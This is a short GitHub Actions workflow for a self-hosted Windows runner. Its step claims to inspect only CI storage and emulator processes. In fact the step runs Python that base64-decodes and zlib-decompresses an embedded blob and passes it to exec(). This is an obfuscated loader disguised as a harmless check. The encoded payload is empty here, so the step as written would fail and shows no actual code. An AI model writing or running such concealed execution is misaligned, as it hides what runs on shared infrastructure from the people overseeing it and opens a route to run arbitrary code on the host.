name: Inspect the existing Windows Android test host
'on':
  push:
    branches: [codex/timeweb-owner-prepare-2026-10-23]
    paths: [.github/workflows/windows-android-preflight.yml]
permissions:
  contents: read
concurrency:
  group: analyst-windows-preflight
  cancel-in-progress: false
jobs:
  inspect:
    runs-on: [self-hosted, Windows, X64, omni-cio-ci]
    timeout-minutes: 6
    steps:
      - name: Inspect only CI storage and emulator processes on the existing Windows host
        shell: cmd
        run: |
          py -3 -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('')),'windows-android-storage','exec'))"
          if errorlevel 1 exit /b 1
